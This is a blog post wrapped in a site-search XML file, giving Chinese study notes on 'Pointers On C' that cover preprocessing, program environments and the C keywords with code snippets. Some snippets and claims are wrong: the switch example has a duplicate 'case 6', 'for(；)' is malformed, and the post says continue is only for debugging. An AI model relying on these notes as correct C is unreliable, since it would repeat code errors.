<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Pointers On C</title>
    <url>/2023/02/28/pointers%20on%20c/</url>
    <content><![CDATA[<h1 id="《Pointers-On-C》（Kenneth-Reek）-【US】"><a href="#《Pointers-On-C》（Kenneth-Reek）-【US】" class="headerlink" title="《Pointers On C》（Kenneth Reek） 【US】 "></a><center>《Pointers On C》（<span id="more"></span>Kenneth Reek） 【US】 </center></h1><h2 id="第一章-快速上手"><a href="#第一章-快速上手" class="headerlink" title="第一章 快速上手"></a>第一章 快速上手</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><h4 id="1-1-1-空白和注释"><a href="#1-1-1-空白和注释" class="headerlink" title="1.1.1 空白和注释"></a>1.1.1 空白和注释</h4><p>注释并不能真正将代码从源文件中删除（&#x2F;**&#x2F;）</p>
<!-- more -->
<blockquote>
<p>从<strong>逻辑</strong>上删除C代码——#if指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#if 0   </span><br><span class="line">statements   </span><br><span class="line">#endif   </span><br></pre></td></tr></table></figure>

<p>在#if和#endif之间的程序段可以去除</p>
</blockquote>
<h4 id="1-1-2-预处理指令"><a href="#1-1-2-预处理指令" class="headerlink" title="1.1.2 预处理指令"></a>1.1.2 <span id="jump">预处理指令</h4><p> #include &lt;stdio.h&gt;<br /><br> #include &lt;stdlib.h&gt;<br /><br> #include &lt;string.h&gt;<br /><br> #define ABC 20&#96;&#96;<!--定义--> <br /><br>  由<strong>预处理器</strong>解释的:预处理器读入源代码，根据预处理指令对其进行修改，然后将修改过的代码递交给编译器。<br /><br>eg:&lt;stdio.h&gt;-&gt;#include</p>
<h4 id="1-1-3-main函数"><a href="#1-1-3-main函数" class="headerlink" title="1.1.3 main函数"></a>1.1.3 main函数</h4><p>每个C程序都必须有一个main函数–&gt;程序执行的<strong>起点</strong><br>main函数<strong>内容</strong>:花括号之间({})</p>
<p>  关键字:int 表示函数返回一个整型值</p>
<h4 id="amp-emsp-amp-emsp-amp-emsp-void表示函数不返回任何值"><a href="#amp-emsp-amp-emsp-amp-emsp-void表示函数不返回任何值" class="headerlink" title="&amp;emsp;&amp;emsp;&amp;emsp;void表示函数不返回任何值"></a>&amp;emsp;&amp;emsp;&amp;emsp;void表示函数不返回任何值</h4><blockquote>
<p>传递方式<br>数组参数: 引用<a href="%E5%8D%B3%E5%9C%B0%E5%9D%80%E8%B0%83%E7%94%A8.">^引用</a><br>标量和常量:  值</p>
</blockquote>
<p>C函数的参数传递规则如下：<font color=red>所有传递给函数的参数都是按值传递的 </font></p>
<blockquote>
<p>字符串:一串以[^NUL]NUL字节结尾的字符。<br>字符串常量:“&amp;emsp; ”中间的</p>
</blockquote>
<h4 id="1-1-4-read-column-numbers函数"><a href="#1-1-4-read-column-numbers函数" class="headerlink" title=" 1.1.4 read_column_numbers函数 "></a><font color=pink> 1.1.4 read_column_numbers函数 </font></h4><h4 id="1-1-5-rearrange函数"><a href="#1-1-5-rearrange函数" class="headerlink" title=" 1.1.5 rearrange函数 "></a><font color=pink> 1.1.5 rearrange函数 </font></h4><h3 id="1-2-补充说明"><a href="#1-2-补充说明" class="headerlink" title="1.2 补充说明"></a>1.2 补充说明</h3><h3 id="1-3-编译"><a href="#1-3-编译" class="headerlink" title="1.3 编译"></a>1.3 编译</h3><h3 id="1-4-总结"><a href="#1-4-总结" class="headerlink" title="1.4 总结"></a>1.4 总结</h3><table>
<thead>
<tr>
<th>格式化输入与输出</th>
<th>非格式化输入与输出</th>
</tr>
</thead>
<tbody><tr>
<td>printf</td>
<td>putchar</td>
</tr>
<tr>
<td>scanf</td>
<td>getchar</td>
</tr>
</tbody></table>
<h3 id="1-5-警告的总结"><a href="#1-5-警告的总结" class="headerlink" title="1.5 警告的总结"></a>1.5 警告的总结</h3><p>1.在scanf函数的<a href="%E5%9C%A8C%E8%AF%AD%E8%A8%80%E4%B8%AD%EF%BC%8C%E6%9E%9A%E4%B8%BE%E5%9E%8B%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E5%90%84%E7%A7%8D%E6%95%B4%E6%95%B0%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%BD%A2%E5%BC%8F%E7%BB%9F%E4%B8%80%E5%8F%AB%E5%81%9A%E6%A0%87%E9%87%8F%E7%B1%BB%E5%9E%8B.%E5%BD%93%E5%9C%A8C%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%A0%87%E9%87%8F%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%80%BC%E6%97%B6%EF%BC%8C%E7%BC%96%E8%AF%91%E5%99%A8%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%B0%86%E8%BF%99%E4%BA%9B%E6%A0%87%E8%AF%86%E7%AC%A6%E8%BD%AC%E6%8D%A2%E4%B8%BA%E6%95%B4%E6%95%B0%E4%BF%9D%E5%AD%98.%E8%BF%99%E7%A7%8D%E6%9C%BA%E5%88%B6%E7%9A%84%E4%BD%9C%E7%94%A8%E6%98%AF%EF%BC%8C%E5%9C%A8%E8%BF%99%E4%BA%9B%E6%A0%87%E9%87%8F%E7%B1%BB%E5%9E%8B%E4%B8%8A%E6%89%A7%E8%A1%8C%E7%9A%84%E6%93%8D%E4%BD%9C%E4%B8%8E%E6%95%B4%E5%9E%8B%E4%B8%8A%E6%89%A7%E8%A1%8C%E7%9A%84%E6%93%8D%E4%BD%9C%E5%AE%8C%E5%85%A8%E4%B8%80%E6%A0%B7.">^标量参数</a>前未加 <font color=red> &amp; </font>.</p>
<!-- more -->

<p>2.&#x3D;&#x3D;与&#x3D;</p>
<h3 id="1-6-编程提示的总结"><a href="#1-6-编程提示的总结" class="headerlink" title="1.6 编程提示的总结"></a>1.6 编程提示的总结</h3><h3 id="1-7-问题"><a href="#1-7-问题" class="headerlink" title="1.7 问题"></a>1.7 问题</h3><h3 id="1-8-编程练习"><a href="#1-8-编程练习" class="headerlink" title="1.8 编程练习"></a>1.8 编程练习</h3><h2 id="第二章-基本概念"><a href="#第二章-基本概念" class="headerlink" title="第二章 基本概念"></a>第二章 基本概念</h2><h3 id="2-1-环境"><a href="#2-1-环境" class="headerlink" title="2.1 环境"></a>2.1 环境</h3><table>
<thead>
<tr>
<th>环境</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><font color=red> 翻译 </font></td>
<td>源代码被转换为可执行的机器指令</td>
</tr>
<tr>
<td><font color=red> 执行 </font></td>
<td>实际执行码</td>
</tr>
</tbody></table>
<h4 id="2-1-1-翻译"><a href="#2-1-1-翻译" class="headerlink" title="2.1.1 翻译"></a>2.1.1 翻译</h4><p>多个源文件经过 <font color=red>编译 </font>——&gt;<strong>目标代码</strong><br>各个目标文件由 <font color=red>链接器(同时引入库)</font>捆绑在一起——&gt;<strong>单一</strong>而<strong>完整</strong>的<strong>可执行程序</strong></p>
<h5 id="1-文件名约定"><a href="#1-文件名约定" class="headerlink" title="1.文件名约定"></a>1.文件名约定</h5><p>C源代码——&gt;.C<br>由#include指令包含到C源代码的文件被称为头文件——&gt;.h<a href="#jump">预处理命令</a></p>
<h5 id="2-编译和链接"><a href="#2-编译和链接" class="headerlink" title="2.编译和链接"></a>2.编译和链接</h5><p>cc:C编译器</p>
<h4 id="2-1-1-执行"><a href="#2-1-1-执行" class="headerlink" title="2.1.1 执行"></a>2.1.1 执行</h4><h5 id="1-程序载入内存中。在宿主环境中（具有操作系统）完成，尚未初始化-amp-amp-不是存储在堆栈中的变量得到初始值"><a href="#1-程序载入内存中。在宿主环境中（具有操作系统）完成，尚未初始化-amp-amp-不是存储在堆栈中的变量得到初始值" class="headerlink" title="1.程序载入内存中。在宿主环境中（具有操作系统）完成，尚未初始化&amp;&amp;不是存储在堆栈中的变量得到初始值"></a>1.程序载入内存中。在宿主环境中（具有操作系统）完成，尚未初始化&amp;&amp;不是存储在堆栈中的变量得到初始值</h5><h5 id="2-一个小型的启动程序与程序链接在一起，调用main函数"><a href="#2-一个小型的启动程序与程序链接在一起，调用main函数" class="headerlink" title="2.一个小型的启动程序与程序链接在一起，调用main函数"></a>2.一个小型的启动程序与程序链接在一起，调用main函数</h5><h5 id="3-执行程序代码"><a href="#3-执行程序代码" class="headerlink" title="3.执行程序代码"></a>3.执行程序代码</h5><p><br/>（1）使用运行时 <font color = red> 堆栈 </font>(stack)——&gt;存储函数的局部变量和返回地址<br>（2）使用 <font color = red> 静态 </font>(static)内存——&gt;存储与静态内存中的变量在程序的整个执行阶段一直保留它们的值(即不变)</p>
<h5 id="4-程序的终止"><a href="#4-程序的终止" class="headerlink" title="4.程序的终止"></a>4.程序的终止</h5><p>1.normol：main&#x2F;exit;<br>2.break;<br>3.error.<br>4.environment</p>
<h3 id="2-2-词法规则"><a href="#2-2-词法规则" class="headerlink" title="2.2 词法规则"></a>2.2 词法规则</h3><p>词法规则类似于语法——&gt;你如何在源程序中形成单独的字符段，即 <font color=red>标记 </font>(token)<br>一个ANSI C程序分为声明和函数。<br>函数：定义了需要执行的工作。<br>声明：描述了函数和(或)函数将要操作的数据类型(sometimes&#x3D;数据本身)</p>
<h4 id="2-2-1-字符"><a href="#2-2-1-字符" class="headerlink" title="2.2.1 字符"></a>2.2.1 字符</h4><p>三字母词<br>eg: ??(——&gt;[  &amp;emsp;&amp;emsp;     ??&lt;——&gt;{<br>转义字符 \ \</p>
<h4 id="2-2-2-注释"><a href="#2-2-2-注释" class="headerlink" title="2.2.2 注释"></a>2.2.2 注释</h4><p>&#x2F;**&#x2F;</p>
<h4 id="2-2-3-自由形式的源代码"><a href="#2-2-3-自由形式的源代码" class="headerlink" title="2.2.3 自由形式的源代码"></a>2.2.3 自由形式的源代码</h4><p>唯一非法：相邻的标记之间必须出现一至多个空白字符(或注释)<br>肥皂盒哲学</p>
<h4 id="2-2-4-标识符"><a href="#2-2-4-标识符" class="headerlink" title="2.2.4 标识符"></a>2.2.4 标识符</h4><h5 id="由ANSI标准定义的C语言"><a href="#由ANSI标准定义的C语言" class="headerlink" title="由ANSI标准定义的C语言"></a>由ANSI标准定义的C语言</h5><p>关键字[<a href="https://blog.csdn.net/CSDN2133/article/details/122010384?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167698178516800180625650%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167698178516800180625650&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2%5D%E5%85%B132%E4%B8%AA">https://blog.csdn.net/CSDN2133/article/details/122010384?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167698178516800180625650%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167698178516800180625650&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2]共32个</a>:</p>
<blockquote>
<p>auto  double  int  struct  break  else  long  switch<br>case  enum  register  typedef  char  extern  return  union<br>const  float  short  unsigned  continue  for  signed  void<br>default  goto  sizeof  volatile  do  if  while  static</p>
</blockquote>
<p>1.数据类型关键字</p>
<p>A基本数据类型（5个）</p>
<blockquote>
<p>void：声明函数无返回值或无参数，声明无类型指针，显式丢弃运算结果<br>char：字符型类型数据，属于整型数据的一种<br>int：整型数据，通常为编译器指定的机器字长<br>float：单精度浮点型数据，属于浮点数据的一种<br>double：双精度浮点型数据，属于浮点数据的一种</p>
</blockquote>
<p>B类型修饰关键字（4个）</p>
<blockquote>
<p>short：修饰int，短整型数据，可省略被修饰的int<br>long：修饰int，长整形数据，可省略被修饰的int<br>signed：修饰整型数据，有符号数据类型<br>unsigned：修饰整型数据，无符号数据类型</p>
</blockquote>
<p>C复杂类型关键字（5个）</p>
<blockquote>
<p>struct：结构体声明<br>union：共用体声明<br>enum：枚举声明<br>typedef：声明类型别名<br>sizeof：得到特定类型或特定类型变量的大小</p>
</blockquote>
<p>D存储级别关键字（6个）</p>
<blockquote>
<p>auto：指定为自动变量，由编译器自动分配及释放。通常在栈上分配<br>static：指定为静态变量，分配在静态变量区，修饰函数时，指定函数作用域为文件内部<br>extern：指定对应变量为外部变量，即在另外的目标文件中定义，可以认为是约定由另外文件声明<br>const：与volatile合称“cv特性”，指定变量不可被当前线程&#x2F;进程改变（但有可能被系统或其他线程&#x2F;进程改变）</p>
</blockquote>
<p>2.流程控制关键字<br>A跳转结构（4个）</p>
<blockquote>
<p>return：用在函数体中，返回特定值（或者是void值，即不返回值）<br>continue：结束当前循环，开始下一轮循环<br>break：跳出当前循环或switch结构<br>goto：无条件跳转语句</p>
</blockquote>
<p>B分支结构（5个）</p>
<blockquote>
<p>if：条件语句  else：条件语句否定分支（与if连用）<br>switch：开关语句（多重分支语句）<br>case：开关语句中的分支标记<br>default：开关语句中的“其他”分治，可选</p>
</blockquote>
<p>C循环结构（3个）</p>
<blockquote>
<p>for：for循环结构，for(1;2;3)4;的执行顺序为1-&gt;2-&gt;4-&gt;3-&gt;2…循环，其中2为循环条件<br>do：do循环结构，do 1 while(2);的执行顺序是1-&gt;2-&gt;1…循环，2为循环条件<br>while：while循环结构，while(1) 2;的执行顺序是1-&gt;2-&gt;1…循环，1为循环条件<br>以上循环语句，当循环条件表达式为真则继续循环，为假则跳出循环。</p>
</blockquote>
<h5 id="标准C语言的32个关键字"><a href="#标准C语言的32个关键字" class="headerlink" title=" 标准C语言的32个关键字 "></a><font color= red> 标准C语言的32个关键字 </font></h5><blockquote>
<p>1、基本数据类型： signed unsigned char int float double short long void<br>2、构造数据类型： struct union enum<br>3、数据存储类别： auto static extern register<br>4、数据优化： const volatile<br>5、9条基本语句： if else switch case break default while do for return continue goto<br>6、其它： typedef sizeof</p>
</blockquote>
<p>预编译处理符 “#”</p>
<blockquote>
<p>#include<br>#define<br>#ifdef<br>#ifndef<br>#if<br>#else<br>#else if<br>#endif<br>等等。</p>
</blockquote>
<h6 id="一、基本数据类型"><a href="#一、基本数据类型" class="headerlink" title="一、基本数据类型 "></a><font color=black>一、基本数据类型 </font></h6><blockquote>
<p>1、unsigned :无符号的<br>&#x2F;&#x2F;用来声明一个无符号的变量。<br>unsigned char var; &#x2F;&#x2F;var的范围：0~255</p>
</blockquote>
<blockquote>
<p>2、signed :有符号的(可以省略不写)<br>&#x2F;&#x2F;用来声明一个有符号的变量。<br>signed char var; &#x2F;&#x2F;var的范围：-128~127</p>
</blockquote>
<blockquote>
<p>3、char :字符型<br>&#x2F;&#x2F;用来声明一个字符型变量。<br>&#x2F;&#x2F;占一个字节空间<br>char var;</p>
</blockquote>
<blockquote>
<p>4、int :整型<br>&#x2F;&#x2F;用来声明一个整型变量。<br>&#x2F;&#x2F;C51：占两个字节空间,ARM：占四个字节<br>int var;</p>
</blockquote>
<blockquote>
<p>5、float :浮点型<br>&#x2F;&#x2F;用来声明一个浮点型(实型)变量。<br>&#x2F;&#x2F;最多能表示到7个有效数据位。<br>&#x2F;&#x2F;占四个字节空间<br>float var;</p>
</blockquote>
<blockquote>
<p>6、double :双精度型<br>&#x2F;&#x2F;用来声明一个双精度实型变量。<br>&#x2F;&#x2F;最多能表示到15~16个有效数据位。<br>&#x2F;&#x2F;占四个字节空间 ,有的系统占八个字节<br>double var;</p>
</blockquote>
<blockquote>
<p>7、short :短整型<br>&#x2F;&#x2F;用来声明一个短整型变量。<br>&#x2F;&#x2F;C51：跟int一样,ARM：占两个字节<br>short var;</p>
</blockquote>
<blockquote>
<p>8、long :长整型<br>&#x2F;&#x2F;用来声明一个长整型变量。<br>&#x2F;&#x2F;ARM：跟int一样,C51：占四个字节<br>long var;</p>
</blockquote>
<blockquote>
<p>9、void :空型<br>&#x2F;&#x2F;表示一个函数没有返回值,或者无形参。<br>void function(void);</p>
</blockquote>
<h6 id="二、构造数据类型"><a href="#二、构造数据类型" class="headerlink" title="二、构造数据类型 "></a><font color=black>二、构造数据类型 </font></h6><blockquote>
<p>1、struct</p>
</blockquote>
<pre><code>//用来声明一种结构体类型。
</code></pre>
<p> struct stu{<br>  char sex;<br>  int age;<br>  float score;<br>  struct stu *Next;<br> };<br> struct stu var;</p>
<blockquote>
<p>2、union<br>&#x2F;&#x2F;用来声明一种共用体类型。<br>&#x2F;&#x2F;该类型的变量所在空间的大小以其成员占最大的那个为准,<br>&#x2F;&#x2F;存入该变量中的值以程序中最后存入的数值为当前值<br>union non{<br>char sex;<br>int age;<br>float score;<br>};<br>union non var;</p>
</blockquote>
<blockquote>
<p>3、enum<br>&#x2F;&#x2F;用来声明一种枚举类型。<br>&#x2F;&#x2F;规定枚举类型的变量,只能在限定的范围内取值<br>&#x2F;&#x2F;否则,编译会出现警告(达到数据安全的效果)<br>enum em<br>{a &#x3D; 23,b,c,d &#x3D; 56,e}; &#x2F;&#x2F;其中b&#x3D;24,c&#x3D;25,e&#x3D;57<br>enum em var;</p>
</blockquote>
<h6 id="三、数据的存储类别"><a href="#三、数据的存储类别" class="headerlink" title="三、数据的存储类别 "></a><font color = black>三、数据的存储类别 </font></h6><blockquote>
<p>1、auto :自动的(可省略不写)<br>&#x2F;&#x2F;定义一个局部变量,默认为auto类型的,<br>&#x2F;&#x2F;当它所在的函数调用结束时,释放内存<br>&#x2F;&#x2F;使用时才分配内存,用完即释放<br>auto char var;</p>
</blockquote>
<blockquote>
<p>2、static :静态的<br>&#x2F;&#x2F;①定义一个局部变量,该变量在定义时只进行<br>&#x2F;&#x2F;一次初始化,以后每次调用它所在的函数,其值<br>&#x2F;&#x2F;都会保持上一次调用的结果,它所在的空间不会<br>&#x2F;&#x2F;被释放<br>&#x2F;&#x2F;②被static修饰的全局变量,则只能在它所在的C<br>&#x2F;&#x2F;源文件中使用,其它文件不能调用,(内部全局变量)<br>&#x2F;&#x2F;③被static修饰的函数,只能在该函数所在的C源文<br>&#x2F;&#x2F;件中被调用,其它文件不能调用,(内部函数)<br>static char var;<br>static void function();</p>
</blockquote>
<blockquote>
<p>3、extern :外部的<br>&#x2F;&#x2F;①想要调用别的C源文件中的某一个全局变量,<br>&#x2F;&#x2F;可以使用该关键字在该文件中修饰声明该变量<br>&#x2F;&#x2F;即可调用(前提是该变量没有被static修饰)<br>&#x2F;&#x2F;该类型的变量也是一直占着内存不释放<br>&#x2F;&#x2F;②想要调用别的C源文件中的某一个函数,<br>&#x2F;&#x2F;可以使用该关键字在该文件中修饰声明该函数<br>&#x2F;&#x2F;即可调用(前提是该函数没有被static修饰)<br>extern char var;<br>extern void function();</p>
</blockquote>
<blockquote>
<p>4、register :寄存器的<br>&#x2F;&#x2F;被这个关键字修饰的变量,建议编译器将该变量在<br>&#x2F;&#x2F;使用时放到CPU内部寄存器中,以提高执行效率<br>&#x2F;&#x2F;注意：该关键字只是”建议”,到底有没有将变量放到<br>&#x2F;&#x2F;寄存器中无从得知。一般使用在循环次数比较多的<br>&#x2F;&#x2F;地方。<br>&#x2F;&#x2F;在使用时才分配内存,用完即释放<br>register long i &#x3D; 30000;</p>
</blockquote>
<h6 id="四、数据优化"><a href="#四、数据优化" class="headerlink" title="四、数据优化 "></a><font color=black>四、数据优化 </font></h6><blockquote>
<p>1、const :常的</p>
</blockquote>
<pre><code>//常变量：被const关键字声明的变量,其值不能被改变。
</code></pre>
<p> &#x2F;&#x2F;即在声明该变量时必须要初始化该变量。<br> &#x2F;&#x2F;var本身还是一个变量。(数据安全检测)<br> const char var &#x3D; 100;<br> char arr[var]; &#x2F;&#x2F;试图声明一个长度为100的字符型数组<br> &#x2F;&#x2F;在MDK (ARM)中可以使用常变量来声明数组的长度<br> &#x2F;&#x2F;在VC++编译环境中也可以。<br> &#x2F;&#x2F;在C51-keil中不可以使用常变量来声明数组的长度<br> char <em>const p;<br> &#x2F;&#x2F;指针变量p不可改变,但是它指向的地址里面的值可变<br>char const</em>p; 或 const char <em>p;<br> &#x2F;&#x2F;指针变量p可以改变,但是它所指向的地址里面的值不能改变<br>const char</em> const p; &#x2F;&#x2F;p地址不可改变,里面的值也不能变</p>
<blockquote>
<p>2、volatile :随时会改变的</p>
</blockquote>
<pre><code>//被volatile修饰的变量或寄存器会意想不到地发生改变。
</code></pre>
<p> &#x2F;&#x2F;①某些变量或寄存器(如状态寄存器)可能会受硬件影响;<br> &#x2F;&#x2F;②在多线程任务中,被其它线程修改(共享内存段);<br> &#x2F;&#x2F;③一个在中断服务中使用到的全局变量<br> &#x2F;&#x2F;④编译器会对C程序进行优化;<br> &#x2F;&#x2F;为了保证程序不被优化,保证CPU取到的数据是最新的<br> &#x2F;&#x2F;(即提醒CPU每次都必须到内存中取出变量当前的值而不<br> &#x2F;&#x2F;是取cache或者寄存器中的备份),使用该关键字修饰,如：<br> int *p;*p &#x3D; 1; <em>p &#x3D; 2;<br> &#x2F;&#x2F;编译时,编译器会对上面的语句进行优化,<br> &#x2F;&#x2F;会直接优化成：<br>int</em>p; <em>p &#x3D; 2;<br> &#x2F;&#x2F;为了保证上面的语句不被优化,加volatile修饰变量：<br>int</em> volatile p;</p>
<h6 id="五、9条语句"><a href="#五、9条语句" class="headerlink" title="五、9条语句 "></a><font color=black>五、9条语句 </font></h6><p>四种结构：</p>
<blockquote>
<p>1、顺序结构：0条 &#x2F;&#x2F;声明语句、运算语句、赋值语句等等</p>
</blockquote>
<blockquote>
<p>2、选择结构：2条 &#x2F;&#x2F;多选一</p>
</blockquote>
<pre><code>①、if -else if -else if ... else
</code></pre>
<p> if(表达式1)<br> {语句s;}<br> else if(表达式2)<br> {语句s;}<br> else if(表达式3)<br> {语句s;}<br> else<br> {语句s;}<br> &#x2F;&#x2F;用法:顺序判断if后的”表达式”是否为真<br> &#x2F;&#x2F;如果碰到为真的情况,则执行其下面的{}里的”语句”<br> &#x2F;&#x2F;执行完后,即退出这个”多选一”的结构</p>
<pre><code>②、switch-case-break
</code></pre>
<p> switch(变量)<br> {<br>  case 常量1：语句;…;break;<br>  case 常量2：语句;…;break;<br>  case 常量3：语句;…;break;<br>  default:语句;<br> }<br> &#x2F;&#x2F;用法：顺序判断”变量”是否与”常量”相等,<br> &#x2F;&#x2F;如果相等,则执行该常量：后的”语句s”,遇到break即跳出<br> &#x2F;&#x2F;这个结构<br> unsigned char i &#x3D; 6;<br> unsigned char dat;<br> switch(i)<br> {<br>  case 3:dat &#x3D; 5;break;<br>  case 5:dat &#x3D; 34;break;<br>  case 6:dat &#x3D; 99;break;<br>  case 7:dat &#x3D; 56;break;<br>  case 6:dat &#x3D; 100;break;<br>  default:dat &#x3D; 68; &#x2F;&#x2F;默认执行<br> }<br> &#x2F;&#x2F;注：如果少了break,则顺序判断i的值与<br> &#x2F;&#x2F;case后面的常量是否相等,如果相等,则执行其<br> &#x2F;&#x2F;后面的语句,以后不再判断,再继续执行下面的<br> &#x2F;&#x2F;每一条case 后面的语句,直到default.<br> &#x2F;&#x2F;这种用法不使用！</p>
<blockquote>
<p>3、循环结构：3条</p>
</blockquote>
<pre><code>①、for
</code></pre>
<p> for(语句1;语句2;语句3)<br> {<br>  语句4;<br>  语句…;<br> }<br> &#x2F;&#x2F;用法：语句1：条件初始化<br> &#x2F;&#x2F;     语句2：判断语句,判断条件是否成立<br> &#x2F;&#x2F;     语句3：修改条件语句<br> &#x2F;&#x2F;先执行语句1,再进行对语句2的判断,如果成立<br> &#x2F;&#x2F;则执行{}里的语句4…,再执行语句3,在判断<br> &#x2F;&#x2F;语句2是否依然成立,。当语句2不成立时,结束循环</p>
<pre><code>②、while
</code></pre>
<p> while(表达式)<br> {<br>  语句;<br>  ….;<br> }<br> &#x2F;&#x2F;用法：先判断“表达式”是否成立,如果成立<br> &#x2F;&#x2F;则执行{}里的语句,执行完再次判断“表达式”<br> &#x2F;&#x2F;是否依然成立,成立则继续执行{},不成立则结束<br> &#x2F;&#x2F;此循环结构。</p>
<p>如何来设计一个死循环？两种方法：<br> for(；)<br> while(1)</p>
<pre><code>③、do-while
</code></pre>
<p> do{<br>  语句1;<br>  …;<br> }while(表达式);<br> &#x2F;&#x2F;用法：先执行{}里的语句,执行完后,判断<br> &#x2F;&#x2F;“表达式”是否成立,如果成立,继续执行{};<br> &#x2F;&#x2F;如果不成立,则结束循环</p>
<blockquote>
<p>4、转移结构：4条</p>
</blockquote>
<pre><code>①、break
</code></pre>
<p> &#x2F;&#x2F;仅用于跳出循环结构<br> &#x2F;&#x2F;且仅能跳出一层循环结构<br> for(i&#x3D;10;i&gt;0;i–)<br> {<br>  t &#x3D; 10;<br>  while(t–)<br>  {<br>   dat++;<br>   if(dat &#x3D;&#x3D; 3)<br>    break;&#x2F;&#x2F;跳出while()结构。<br>  }<br> }</p>
<pre><code>②、continue
</code></pre>
<p> &#x2F;&#x2F;用于终止本次循环,继续从下次循环开始<br> &#x2F;&#x2F;正式程序中不使用,仅用于调试程序<br> char buf &#x3D; 10;<br> while(buf–)<br> {<br>  a++;<br>  b++;<br>  continue;&#x2F;&#x2F;遇到continue则结束这次循环<br>  d++; &#x2F;&#x2F;这条永远都不会执行到<br>  e++; &#x2F;&#x2F;这条永远都不会执行到<br> }</p>
<pre><code>③、goto
</code></pre>
<p> &#x2F;&#x2F;无条件转移<br> &#x2F;&#x2F;一般都不建议在大的程序当中使用<br> unsigned char dat&#x3D;10;<br> while(dat–)<br> {<br>  a++;<br>  b++;<br>     Lable: c++;<br>  if(c &#x3D;&#x3D; 3)<br>  goto Lable;&#x2F;&#x2F;直接跳到Lable标号去<br>  d++;<br> }</p>
<pre><code>④、return
</code></pre>
<p> &#x2F;&#x2F;用于函数返回,<br> &#x2F;&#x2F;在函数调用时,遇到return即返回。<br> &#x2F;&#x2F;如果需要返回某个值,在其后加上返回值。<br> &#x2F;&#x2F;返回值类型必须和函数类型一致。<br> void function()<br> {<br>  char a,b;<br>  a++;<br>  return; &#x2F;&#x2F;遇到return即返回调用处<br>  b++; &#x2F;&#x2F;不会被执行<br>  return; &#x2F;&#x2F;不会被执行<br> }</p>
<h6 id="六、其它"><a href="#六、其它" class="headerlink" title=" 六、其它 "></a><font color=black> 六、其它 </font></h6><blockquote>
<p>1、typedef : 类型重定义</p>
</blockquote>
<pre><code>typedef unsigned char uchar;
</code></pre>
<p> &#x2F;&#x2F;用uchar重新定义unsigned char<br> #define uchar unsigned char<br> &#x2F;&#x2F;用uchar 替换unsigned char<br>跟<font color=red>宏定义 </font>的区别：<br> ①、typedef 是在编译阶段进行定义<br>  宏定义是在预编译处理阶段完成展开<br> ②、typedef 是类型重新定义,不是简单地替换<br>  宏定义只是简单的替换,没有定义<br> typedef unsigned char<em>M;<br> #define M unsigned char</em><br> M p1,p2;<br> &#x2F;&#x2F;对于typedef来说：p1是指针变量,p2也是<br> &#x2F;&#x2F;对于宏定义来说：p1是指针变量,p2是普通变量</p>
<blockquote>
<p>2、sizeof</p>
</blockquote>
<pre><code>//用来求类型所占的字节数
</code></pre>
<p> int var &#x3D; 10;<br> char g;<br> g &#x3D; sizeof(var++);&#x2F;&#x2F;g &#x3D; 4;<br> &#x2F;&#x2F;注意：var++该条语句没有被执行！<br> &#x2F;&#x2F;()里的语句是不会被执行的。</p>
<h4 id="2-2-5-程序的形式"><a href="#2-2-5-程序的形式" class="headerlink" title="2.2.5 程序的形式"></a>2.2.5 程序的形式</h4><p>较合理的组织形式：<br>一个C程序的源代码保存在一个或多个源文件中，但一个函数只能完整出现在同一个源文件中。<br>C程序的源文件应该包含一组相关的函数&amp;&amp;（使实现抽象数据类型成为可能）。<br>每个源文件分别编译，最后合体</p>
<h3 id="2-3-程序风格"><a href="#2-3-程序风格" class="headerlink" title="2.3 程序风格"></a>2.3 程序风格</h3><p>使用Tab键<br>别人看的懂</p>
<h3 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4 总结"></a>2.4 总结</h3><h3 id="2-5-警告的总结"><a href="#2-5-警告的总结" class="headerlink" title="2.5 警告的总结"></a>2.5 警告的总结</h3><h3 id="2-6-编程提示的总结"><a href="#2-6-编程提示的总结" class="headerlink" title="2.6 编程提示的总结"></a>2.6 编程提示的总结</h3><h3 id="2-7-问题"><a href="#2-7-问题" class="headerlink" title="2.7 问题"></a>2.7 问题</h3><h3 id="2-8-编程练习"><a href="#2-8-编程练习" class="headerlink" title="2.8 编程练习"></a>2.8 编程练习</h3><h2 id="第三章-数据"><a href="#第三章-数据" class="headerlink" title="第三章 数据"></a>第三章 数据</h2><p>类型，特点，声明<br>变量的三个属性——作用域、链接属性、存储类型即<br>可视性(它在什么地方可以使用) + 生命期(值能保存多久)</p>
<h3 id="3-1-基本数据类型"><a href="#3-1-基本数据类型" class="headerlink" title="3.1 基本数据类型"></a>3.1 基本数据类型</h3><p>4种基本数据类型——整形、浮点型、指针、聚合类型</p>
<h4 id="3-1-1-整型家族"><a href="#3-1-1-整型家族" class="headerlink" title="3.1.1 整型家族"></a>3.1.1 整型家族</h4><p>字符 短整型 整形 长整型 （搞这么复杂，不就是字符和整形吗）<br>有符号       无符号<br><font color= red>字符在本质上是小整型值 </font></p>
<h5 id="整形字面值"><a href="#整形字面值" class="headerlink" title="整形字面值"></a>整形字面值</h5><p>字面值：字面值常量——一种实体，指定了自身的值&amp;&amp;不允许发生改变</p>
<h5 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h5><p>它的值是符号常量非字面值的类型<br>enum</p>
